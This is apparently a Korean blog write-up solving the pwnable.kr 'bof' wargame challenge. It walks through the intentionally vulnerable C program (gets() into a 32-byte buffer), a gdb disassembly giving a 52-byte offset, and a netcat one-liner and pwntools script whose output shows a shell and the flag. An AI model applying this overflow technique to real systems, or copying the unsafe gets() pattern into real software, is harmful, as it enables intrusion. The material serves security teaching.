---
title: "[pwnable.kr][Toddler] bof"
tags: [pwnable.kr, Toddler's Bottle, writeup]
author: eli_ez3r
key: 20180913
modify_date: 2018-09-13
article_header:
  type: cover
  image:
    src: /assets/img/write-up/pwnable_kr.png
---

## keyword : Stack Canary

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

### 0x01. Staic Analysis

main에서 func함수를 호출하는데 인자 값으로 `0xdeadbeef`값을 전달한다.

func 함수에서 key값으로 `0xdeadbeef`를 받고, 사용자로 부터 입력 값을 받아 `overflowme` 배열에 저장한다.

<u>이때 overflowme배열은 32byte크기지만, gets함수로 입력을 받아 buffer overflow가 발생한다.</u>

그리고 key값이 `0xcafebabe` 인지 체크하고 맞으면 쉘을 실행한다.

**즉, buffer overflow를 시켜 func함수의 인자 값을 `0xcafebabe`로 변조하면 문제가 풀린다.**

-----

### 0x02. Dynamic Analysis

이제 func함수의 인자 값이 들어가는 스택 주소와, overflowme 배열의 주소의 거리를 구해야한다.

```
gdb-peda$ pdisas func
Dump of assembler code for function func:
   0x0000062c <+0>:     push   ebp
   0x0000062d <+1>:     mov    ebp,esp
   0x0000062f <+3>:     sub    esp,0x48
   0x00000632 <+6>:     mov    eax,gs:0x14
   0x00000638 <+12>:    mov    DWORD PTR [ebp-0xc],eax
   0x0000063b <+15>:    xor    eax,eax
   0x0000063d <+17>:    mov    DWORD PTR [esp],0x78c
   0x00000644 <+24>:    call   0x645 <func+25>
   0x00000649 <+29>:    lea    eax,[ebp-0x2c]
   0x0000064c <+32>:    mov    DWORD PTR [esp],eax
   0x0000064f <+35>:    call   0x650 <func+36>
   0x00000654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x0000065b <+47>:    jne    0x66b <func+63>
   0x0000065d <+49>:    mov    DWORD PTR [esp],0x79b
   0x00000664 <+56>:    call   0x665 <func+57>
   0x00000669 <+61>:    jmp    0x677 <func+75>
   0x0000066b <+63>:    mov    DWORD PTR [esp],0x7a3
   0x00000672 <+70>:    call   0x673 <func+71>
   0x00000677 <+75>:    mov    eax,DWORD PTR [ebp-0xc]
   0x0000067a <+78>:    xor    eax,DWORD PTR gs:0x14
   0x00000681 <+85>:    je     0x688 <func+92>
   0x00000683 <+87>:    call   0x684 <func+88>
   0x00000688 <+92>:    leave
   0x00000689 <+93>:    ret
End of assembler dump.
```

`func+29` 부분을 보면 oeverflowme 배열의 주소를 eax에 저장하는데, `overflowme` 배열의 주소는 `ebp-0x2c` 이다. (0x2c = 44)

그리고 `func+40` 부분을 보면 func함수의 인자 값과 `0xcafebabe`와 비교하는데 이때 인자 값의 주소는 `ebp+0x8` 이다.

**따라서 overflowme 배열과 key값(func함수의 인자 값)의 주소의 거리는 52byte가 된다.**

-----

### 0x03. Exploit

그럼 이제 52byte의 쓰레기 값을 넣고, `0xcafebabe` 값을 넣어 `0xdeadbeef` 값을 변조시키자.

```
root@ubuntu:~/pwnable/bof# (python -c 'print "A"*52+"\xbe\xba\xfe\xca"';cat) | nc pwnable.kr 9000
cat flag
daddy, I just pwned a buFFer :)
```

끄읏 :)

-----

##### python

```python
from pwn import *

conn = remote("pwnable.kr", 9000)

payload = "A"*52
payload += p32(0xcafebabe)

conn.sendline(payload)
conn.interactive()
```

```
root@ubuntu:~/pwnable/bof# python ex.py
[+] Opening connection to pwnable.kr on port 9000: Done
[*] Switching to interactive mode
$ ls -l
total 3748
-r-xr-x--- 1 root bof     7348 Sep 12  2016 bof
-rw-r--r-- 1 root root     308 Oct 23  2016 bof.c
-r--r----- 1 root bof       32 Jun 11  2014 flag
-rw------- 1 root root 3812010 Nov 14 21:45 log
-rw-r--r-- 1 root root       0 Oct 23  2016 log2
-rwx------ 1 root root     760 Sep 11  2014 super.pl
$ cat flag
daddy, I just pwned a buFFer :)
```

-----